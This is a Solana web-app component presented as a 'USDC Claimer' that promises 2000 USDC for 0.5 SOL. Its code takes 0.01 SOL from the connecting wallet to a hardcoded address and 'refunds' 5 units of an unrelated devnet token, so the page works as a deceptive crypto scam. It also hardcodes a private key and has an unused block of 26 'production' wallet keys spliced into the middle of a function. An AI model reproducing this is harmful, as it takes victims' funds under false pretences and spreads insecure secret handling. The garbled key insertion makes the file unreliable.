/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2fCCRx98SH5YCa3CKuvLgRS1A71N2mvtDjbyncZKZh6kM4fCUS8xwY3XYKwEinusXCENWNtqAH4MiAiVaKoM3dkc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "47uMzR8ops8PwAjgaidUKczSBhLSaWPBh6WKEXVYMAFsfhhS86a7v3xTGoyMF6JVexaq5WXjz5hMYGWaU2buonos",
  "key1": "LXuvfqnzFCoacJvwzo7u6EbEo9hreq3xrgcnShHeSSofGY3ANdQK3ia8h45Em7hhAR5isLHyhVm8HxPEXbCwf1V",
  "key2": "4k8nP4wFsQdeUMj3cgui4piFhH8EAupaXACgiqgYDR6W5trqZTqhTA2BSw7DiM4LaB69VTZkiCc5dnQA9SBJNjJd",
  "key3": "35ixwtT1PyCGBWwNLbKLQqJkUXvopsKr9XLbvJefJm8fiCNmxMvb6g1zaLZ1tpxF6qeEPQURAUGS3oaBU7GQjCa",
  "key4": "21kJ53zcDSdhscRfV7HdCLWQQdpimc2WLK8wEohL39MpPDiUHz8HACEncQCkMPzT7u8jVBMxkwuKsVeeviF4LbDk",
  "key5": "fs45717CBiWXoG8yC4iXZWrpkAmYetpRbVNiVbzp2K8FE4U3G8w4oWCeYf5Dr9BCtbqSnXJgqdgCtbnjasUHScs",
  "key6": "49KhpFDKXWJPwXhrCHXHfFSgwJYFzJcdgbpwACDruHUtggqnaaWUEvt3eL1idieRKiU19TMydzDmdDaqrugWBqFU",
  "key7": "JYw2CahHNYuGVjmrttosU2UGe8pDntvgXaqWhNXkohivLqC1z53biKEVnhKAg8qaCM6Jwgtc3wonpTKePQYCFkE",
  "key8": "2pxuv9ge2JsNe8AHx3fZ758sYBKa5yr4hxCoD37UK2djmME8iUzcvDwbjknx4MuLiQtdR3A91BjvxJG9iJ4CYY2u",
  "key9": "65fvQB8PMzmdSWgGZ5zQF2xijzRCx2sGeDt2kjErtdEefLD2o9kD7BrMtdf5voZR3YrB6CM3mN2J8EQp7S2Qifmx",
  "key10": "5RKz8odPZHNkdmP4g9Q6TGKhfasurF9JaB7MfQzGu6xxmmHv2sRQibvwBZ8KssD4yUFj1ttKdonHktnQT1g4Afhs",
  "key11": "eTMnDWvbieWqAYCvdE4JrrqzNHS6MDBpNr35soZFmi39fwVrY5dEMNk6DveAPcdTjGeQwhyzcDdyuE1mgW1FUEG",
  "key12": "5vD3us8YD4nhJ3CJgZCN92RfKq4RRDG2jPAuUjwvoXLX1oNmY4tcSu7N79v6tAitTrw8qDUq7yL1R63gspgQXDPg",
  "key13": "2jWduNc5Guu7eQ7xqh8cYkxCgS1BJ7AeeWZCT3BECUBrWcnjuGXN5435oNizeZ2T9GECWq1PiZk7wHgm9p9vYdHB",
  "key14": "5NpRticCu5DkBK9ppGMk629fvdEtMNJoMJEqmZQbdAUFKyDqYBf7PYmcFy89AEMQarRkgwzh9hJ1E2e8BJReoN3q",
  "key15": "45HEw8HAKNVSVAzpB8caXPsvhJKpK5GW11V5aFjCj7mdTHv4qtMkRosbX3Kh5didLEbh74vbfD7JvonRXgJ4n4sK",
  "key16": "4ridz9tCfxmVUxUDod9u7nXvMyhKvNtSvEXXxHEHYG2GMxdsu4PVFsBkPj4QW28kBoTTgrdyPwyrXJNqwENTCVAP",
  "key17": "4SPoZagPd7degLH4twTVpuehN9Yo7rJ81aMNema7rhXyGvFNRE2nyG4bqDPrMgH4MchRi3YbAmkmSj3xL7LDfBMN",
  "key18": "3dB5soTqe9mzCC3LtqodevCxokcC6Pr3eUL29PdRxfziKXTjDDtz8frWPyuj54cfgZmXwdCnnhUUFtQsjSQKK9NG",
  "key19": "3gekXsq8uTyPr2xBS11n3bp7eqshpcobznU5UiXEsS8P6nZmFAVZ6jfhyKrndmCRMobL5SFeYQnRPKobkvFT24qq",
  "key20": "3yRhinsy56Ty8WucsMkXNB3bkKMVJLHnGHyn27UUTMgPAsxjro1Er3Tipbnsi5VaP2stDrJLiZi7eATVqMZVQgRk",
  "key21": "3jyQu1RWi4adjSaSBEYVWDa4NeT84hGSXNyjD6fap72L51cN1zFm6nkRCZNbRTqr9rG8c63PH9afUyQ6ojnEZsGj",
  "key22": "u9XKCytmGsTv2J2Pk1ZTevwVtRxL9TWe6f5vBoxbWPFSxhKDRHCGqhWx8foqdb3VodBBd4xDUpaEhB6jK2FspKg",
  "key23": "55c3vTAaaH8Ak3gd2bijaW3zPwf4ez9AzhNnm8QZLC1uSDBnyW45zKL6B1GMvppVBS7yMuYN278UTxk1DcfQQJM6",
  "key24": "pbAJGjovPzqGKpdySmPoEbQCCNUEMFEkGugwNfBashGGZomL6ux5PSkSZwjvHWFLggnhkcg6sMN5Av2dTDe7RJA",
  "key25": "4HWygJADrzbw4iZkfQMTHkGAyWUYnjzmyv8ybPuffPBSJvTLGpA18B4KqhEmiQNRatoeiNpa5Y7eFnbbL823fqmP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
